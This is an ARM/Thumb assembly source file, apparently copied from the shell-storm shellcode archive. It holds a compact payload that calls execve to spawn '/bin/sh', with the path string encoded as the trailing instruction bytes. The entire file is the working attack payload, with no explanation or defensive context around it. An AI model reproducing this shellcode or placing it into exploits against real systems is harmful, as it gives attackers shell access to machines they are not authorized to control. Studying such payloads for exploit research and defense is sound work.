.section .text
.global _start

@ http://shell-storm.org/shellcode/files/shellcode-665.php

_start:
    add     r3, pc, #1
    bx      r3
    mov     r0, pc
    adds    r0, #10
    str     r0, [sp, #4]
    add     r1, sp, #4
    subs    r2, r2, r2
    movs    r7, #11
    svc     1
    @ "//bin/sh"
    cmp     r7, #47
    ldr     r2, [r4, #20]
    cmp     r7, #110
    ldr     r3, [r6, #4]
